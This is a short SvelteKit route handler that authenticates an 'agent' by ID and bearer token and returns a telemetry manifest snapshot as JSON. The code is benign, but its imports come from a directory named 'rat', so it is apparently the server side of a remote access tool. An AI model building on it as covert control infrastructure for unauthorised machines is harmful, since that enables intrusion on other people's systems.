import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store.js';
import { telemetryStore, getBearerToken } from './_shared.js';

export const GET: RequestHandler = async ({ params, request }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        const token = getBearerToken(request.headers.get('authorization'));
        if (!token) {
                throw error(401, 'Missing agent key');
        }

        try {
            registry.authorizeAgent(id, token);
        } catch (err) {
                if (err instanceof RegistryError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to authorize agent');
        }

        const snapshot = await telemetryStore.getManifestSnapshot();
        return json(snapshot);
};
